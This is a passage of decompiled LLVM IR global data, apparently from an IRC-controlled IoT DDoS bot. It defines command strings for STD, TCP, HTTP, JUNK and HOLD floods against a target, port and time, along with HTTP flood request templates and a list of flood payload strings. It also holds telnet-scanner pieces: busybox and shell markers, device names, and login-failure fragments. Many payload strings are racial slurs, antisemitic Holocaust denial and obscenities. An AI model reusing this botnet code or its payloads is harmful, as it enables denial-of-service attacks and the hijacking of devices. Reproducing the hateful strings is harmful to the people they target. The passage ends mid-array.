@global_var_37be4.470 = constant [4 x i8] c"rst\00"
@global_var_37be8.472 = constant [4 x i8] c"fin\00"
@global_var_37bec.474 = constant [4 x i8] c"ack\00"
@global_var_37bf0.476 = constant [4 x i8] c"psh\00"
@global_var_37bf4.478 = constant [4 x i8] c"urg\00"
@global_var_37bf8.481 = constant [85 x i8] c"NOTICE %s :UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs>\0A\00"
@global_var_37c50.483 = constant i32 48
@global_var_37c54.485 = constant [7 x i8] c"random\00"
@global_var_37c5c.487 = constant [49 x i8] c"NOTICE %s :Unknowning %s:%s with packet size %s\0A\00"
@global_var_37c90.493 = constant [4 x i8] c"std\00"
@global_var_37c94.494 = constant [4 x i8] c"dts\00"
@global_var_37c98.495 = constant [4 x i8] c"lsk\00"
@global_var_37c9c.496 = constant [4 x i8] c"kek\00"
@global_var_37ca0.497 = constant [6 x i8] c"smack\00"
@global_var_37ca8.498 = constant [4 x i8] c"ily\00"
@global_var_37cac.499 = constant [10 x i8] c"tfw no gf\00"
@global_var_37cb8.500 = constant [11 x i8] c"frienzoned\00"
@global_var_37cc4.501 = constant [4 x i8] c"tyf\00"
@global_var_37cc8.502 = constant [4 x i8] c"pos\00"
@global_var_37ccc.503 = constant [6 x i8] c"cunts\00"
@global_var_37cd4.504 = constant [9 x i8] c"NullzSec\00"
@global_var_37ce0.505 = constant [13 x i8] c"NullzSec rox\00"
@global_var_37cf0.506 = constant [21 x i8] c"Sh4dow on your 4head\00"
@global_var_37d08.507 = constant [10 x i8] c"get raped\00"
@global_var_37d14.508 = constant [18 x i8] c"not a ddos packet\00"
@global_var_37d28.509 = constant [23 x i8] c"also not a ddos packet\00"
@global_var_37d40.510 = constant [28 x i8] c"seriously not a ddos packet\00"
@global_var_37d5c.511 = constant [38 x i8] c"GET / HTTP/1.1\0D\0AHost: goatse.info\0D\0A\0D\0A\00"
@global_var_37d84.512 = constant [37 x i8] c"GET / HTTP/1.1\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00"
@global_var_37dac.513 = constant [38 x i8] c"GET / HTTP/1.0\0D\0AHost: goatse.info\0D\0A\0D\0A\00"
@global_var_37dd4.514 = constant [37 x i8] c"GET / HTTP/1.0\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00"
@global_var_37dfc.515 = constant [16 x i8] c"8======D~~~~~~~\00"
@global_var_37e0c.516 = constant [8 x i8] c"suck it\00"
@global_var_37e14.517 = constant [10 x i8] c"give succ\00"
@global_var_37e20.518 = constant [47 x i8] c"big nigger dick 8============================D\00"
@global_var_37e50.519 = constant [18 x i8] c"( . Y . ) tiddies\00"
@global_var_37e64.520 = constant [9 x i8] c"bigNullz\00"
@global_var_37e70.521 = constant [13 x i8] c"eye pee rape\00"
@global_var_37e80.522 = constant [21 x i8] c"eye pee address rape\00"
@global_var_37e98.523 = constant [8 x i8] c"IP rape\00"
@global_var_37ea0.524 = constant [13 x i8] c"This is LOIC\00"
@global_var_37eb0.525 = constant [5 x i8] c"LOIC\00"
@global_var_37eb8.526 = constant [5 x i8] c"HOIC\00"
@global_var_37ec0.527 = constant [5 x i8] c"XOIC\00"
@global_var_37ec8.528 = constant [7 x i8] c"LHXOIC\00"
@global_var_37ed0.529 = constant [33 x i8] c"A cat is fine too. Desudesudesu~\00"
@global_var_37ef4.530 = constant [18 x i8] c"the biiiiig pussy\00"
@global_var_37f08.531 = constant [6 x i8] c"benis\00"
@global_var_37f10.532 = constant [6 x i8] c"penis\00"
@global_var_37f18.533 = constant [5 x i8] c"dick\00"
@global_var_37f20.534 = constant [7 x i8] c"vagina\00"
@global_var_37f28.535 = constant [9 x i8] c"clitoris\00"
@global_var_37f34.536 = constant [6 x i8] c"pussy\00"
@global_var_37f3c.537 = constant [4 x i8] c"tfw\00"
@global_var_37f40.538 = constant [4 x i8] c":^}\00"
@global_var_37f44.539 = constant [9 x i8] c"dic pic?\00"
@global_var_37f50.540 = constant [11 x i8] c"send nudes\00"
@global_var_37f5c.541 = constant [29 x i8] c"https://youtu.be/dQw4w9WgXcQ\00"
@global_var_37f7c.542 = constant [24 x i8] c"Never gonna give you up\00"
@global_var_37f94.543 = constant [25 x i8] c"Never gonna make you cry\00"
@global_var_37fb0.544 = constant [24 x i8] c"Never gonna let you die\00"
@global_var_37fc8.545 = constant [21 x i8] c"Never gonna hurt you\00"
@global_var_37fe0.546 = constant [14 x i8] c"bush did 9/11\00"
@global_var_37ff0.547 = constant [32 x i8] c"jet fuel can't melt steel beams\00"
@global_var_38010.548 = constant [24 x i8] c"Kuze-senpai is your god\00"
@global_var_38028.549 = constant [23 x i8] c"the illuminati is real\00"
@global_var_38040.550 = constant [14 x i8] c"wake up sheep\00"
@global_var_38050.551 = constant [22 x i8] c"i flex like david ike\00"
@global_var_38068.552 = constant [35 x i8] c"6 million jews? show me the proof!\00"
@global_var_3808c.553 = constant [18 x i8] c"T R I G G E R E D\00"
@global_var_380a0.554 = constant [21 x i8] c"my gf killed herself\00"
@global_var_380b8.555 = constant [22 x i8] c"free masons suck cock\00"
@global_var_380d0.556 = constant [10 x i8] c"ihatejews\00"
@global_var_380dc.557 = constant [6 x i8] c"urgay\00"
@global_var_380e4.558 = constant [16 x i8] c"tfw u like dick\00"
@global_var_380f4.559 = constant [9 x i8] c"dickbutt\00"
@global_var_38100.560 = constant [20 x i8] c"The elusive dickbut\00"
@global_var_38114.561 = constant [27 x i8] c"Heyyy that's pretty gooood\00"
@global_var_38130.562 = constant [15 x i8] c"NSA sucks cock\00"
@global_var_38140.563 = constant [15 x i8] c"FBI sucks cock\00"
@global_var_38150.564 = constant [55 x i8] c"You name it they suck cockWhat am I doing with my life\00"
@global_var_38188.565 = constant [28 x i8] c"Oh yeah I like nulling shit\00"
@global_var_381a4.566 = constant [29 x i8] c"HIIYYOOOOOOO (Customgrow420)\00"
@global_var_381c4.567 = constant [28 x i8] c"Keemstar is a fucking knome\00"
@global_var_381e0.568 = constant [17 x i8] c"Leafy is gawd <3\00"
@global_var_381f4.569 = constant [25 x i8] c"Ourmine is full of skids\00"
@global_var_38210.570 = constant [23 x i8] c"Sh4dow is the greatest\00"
@global_var_38228.571 = constant [79 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_37c90.493, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_37c94.494, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_37c98.495, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_37c9c.496, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_37ca0.497, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_37ca8.498, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_37cac.499, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_37cb8.500, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_37cc4.501, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_37cc8.502, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_37ccc.503, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_37cd4.504, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_37ce0.505, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_37cf0.506, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_37d08.507, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_37d14.508, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_37d28.509, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_37d40.510, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_37d5c.511, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @global_var_37d84.512, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_37dac.513, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @global_var_37dd4.514, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_37dfc.515, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_37e0c.516, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_37e14.517, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_37e20.518, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_37e50.519, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_37e64.520, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_37e70.521, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_37e80.522, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_37e98.523, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_37e80.522, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_37ea0.524, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_37eb0.525, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_37eb8.526, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_37ec0.527, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_37ec8.528, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_37ed0.529, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_37ef4.530, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_37f08.531, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_37f10.532, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_37f18.533, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_37f20.534, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_37f28.535, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_37f34.536, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_37f3c.537, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_37f40.538, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_37f44.539, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_37f50.540, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @global_var_37f5c.541, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_37f7c.542, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_37f94.543, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_37fb0.544, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_37fc8.545, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_37fe0.546, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_37ff0.547, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_38010.548, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_38028.549, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_38040.550, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_38050.551, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @global_var_38068.552, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_3808c.553, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_380a0.554, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_380b8.555, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_380d0.556, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_380dc.557, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_380e4.558, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_380f4.559, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_38100.560, i32 0, i32 0), i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_38114.561, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_38130.562, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_38140.563, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_38150.564, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_38188.565, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @global_var_381a4.566, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_381c4.567, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_381e0.568, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_381f4.569, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_38210.570, i32 0, i32 0)]
@global_var_3836c.574 = constant [35 x i8] c"NOTICE %s :STD <ip> <port> <time>\0A\00"
@global_var_38390.577 = constant [32 x i8] c"NOTICE %s :STD attacking %s:%s\0A\00"
@global_var_383b0.579 = constant [7 x i8] c"(null)\00"
@global_var_383f0.602 = constant [92 x i8] c"NOTICE %s :TCP <target> <port> <time> <flags/method> <packetsize> <pollinterval> <threads>\0A\00"
@global_var_3844c.605 = constant [54 x i8] c"NOTICE %s :TCP flooding %s:%d with %s and %d threads\0A\00"
@global_var_38484.607 = constant [6 x i8] c"close\00"
@global_var_3848c.608 = constant [11 x i8] c"keep-alive\00"
@global_var_38498.609 = constant [7 x i8] c"accept\00"
@global_var_384a0.610 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_38484.607, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_3848c.608, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_38498.609, i32 0, i32 0)]
@global_var_384ac.617 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0AConnection: %s\0D\0A\0D\0A\00"
@global_var_384ec.619 = constant [64 x i8] c"NOTICE %s :HTTP <method> <target> <port> <path> <time> <power>\0A\00"
@global_var_3852c.621 = constant [46 x i8] c"NOTICE %s :HTTP %s flooding %s with %d power\0A\00"
@global_var_3855c.624 = constant [36 x i8] c"NOTICE %s :JUNK <ip> <port> <time>\0A\00"
@global_var_38580.626 = constant [32 x i8] c"NOTICE %s :JUNK flooding %s:%s\0A\00"
@global_var_385a0.628 = constant [36 x i8] c"NOTICE %s :HOLD <ip> <port> <time>\0A\00"
@global_var_385c4.630 = constant [32 x i8] c"NOTICE %s :HOLD flooding %s:%s\0A\00"
@global_var_35630.632 = constant [8 x i8] c"busybox\00"
@global_var_36a74.633 = constant i32 36
@global_var_36a78.634 = constant i32 35
@global_var_36a7c.635 = constant [6 x i8] c"shell\00"
@global_var_36a04.636 = constant [7 x i8] c"dvrdvs\00"
@global_var_36a0c.637 = constant [8 x i8] c"mdm9625\00"
@global_var_36a14.638 = constant [9 x i8] c"9615-cdp\00"
@global_var_36a20.639 = constant [5 x i8] c"F600\00"
@global_var_36a28.640 = constant [5 x i8] c"F660\00"
@global_var_36a30.641 = constant [5 x i8] c"F609\00"
@global_var_36a38.642 = constant [4 x i8] c"BCM\00"
@global_var_36a84.643 = constant i32 62
@global_var_452f4.644 = global [12 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_35630.632, i32 0, i32 0), i8* bitcast (i32* @global_var_36a74.633 to i8*), i8* bitcast (i32* @global_var_36a78.634 to i8*), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36a7c.635, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36a04.636, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36a0c.637, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36a14.638, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36a20.639, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36a28.640, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36a30.641, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_36a38.642, i32 0, i32 0), i8* bitcast (i32* @global_var_36a84.643 to i8*)]
@global_var_36a3c.646 = constant [7 x i8] c"nvalid\00"
@global_var_36a44.647 = constant [6 x i8] c"ailed\00"
@global_var_36a4c.648 = constant [9 x i8] c"ncorrect\00"
@global_var_36a58.649 = constant [6 x i8] c"enied\00"
@global_var_36a60.650 = constant [5 x i8] c"rror\00"
@global_var_36a68.651 = constant [7 x i8] c"oodbye\00"
@global_var_36a70.652 = constant [4 x i8] c"bad\00"
@global_var_452d4.653 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36a3c.646, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36a44.647, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36a4c.648, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36a58.649, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36a60.650, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36a68.651, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_36a70.652, i32 0, i32 0)]
@global_var_385e4.655 = constant [6 x i8] c":>%$#\00"
@global_var_452a0 = external global i32
@global_var_44d7c.663 = global [328 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36754.250, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36768.252, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_36770.253, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36778.254, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_36780.255, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36790.256, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36754.250, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36798.257, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367a0.258, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367a8.259, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_367b8.261, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_367c0.262, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_367c8.263, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367d8.265, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_367f4.267, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_36800.268, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36804.269, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3680c.270, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36814.271, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36820.272, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3682c.273, i32 0, i32 0), i8* getelementptr inbounds ([6 